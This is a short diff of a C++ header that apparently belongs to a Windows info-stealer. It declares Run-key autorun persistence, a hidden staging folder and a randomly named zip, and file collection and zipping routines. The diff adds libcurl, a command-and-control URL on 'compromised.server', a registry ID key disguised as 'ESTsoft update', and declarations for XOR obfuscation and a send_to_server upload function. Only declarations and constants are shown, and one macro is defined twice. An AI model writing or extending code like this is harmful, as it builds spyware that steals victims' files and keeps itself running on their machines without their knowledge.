@@ -26,9 +26,16 @@
 #include <filesystem>
 #include <ShlObj.h>
 #include "libzippp/libzippp.h"
-
+#include <sstream>
+#include "curl/curl.h"
+#include <cstdio>
+#pragma comment(lib, "wldap32.lib")
+#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "CRYPT32.lib")
+#pragma comment(lib, "Normaliz.lib")
 namespace fs = std::filesystem;
 
+#define SERVER_CONTROL_PAGE "http://compromised.server/control/control.php"
 #define AUTORUN_PATH "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define AUTORUN_VALUE "a2McCq"
 #define SAVE_PATH "C:\\Users\\Public\\Libraries\\"
@@ -36,6 +43,9 @@ namespace fs = std::filesystem;
 #define ZIP_PATH "C:\\Users\\Public\\Libraries\\vpllrvyrfgolr.zip"
 #define TEST_MODE "SOFTWARE\\test"
 #define TEST_VALUE "TEST_MODE"
+#define SERVER_CONTROL_PAGE "http://compromised.server/control/control.php?"
+#define UID_PATH "SOFTWARE\\ESTsoft"
+#define UID_VALUE "update"
 
 /*
 0x00 : CSIDL_DESKTOP
@@ -58,7 +68,9 @@ bool collect_files();
 bool zip_dir();
 bool check_test_mode();
 std::string mb_to_utf8(const std::string& mbstr);
-
+bool send_to_server(std::string file_path);
+std::string xor_string(const std::string& str, char key);
+static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp);
 // add headers that you want to pre-compile here
 #include "framework.h"
 
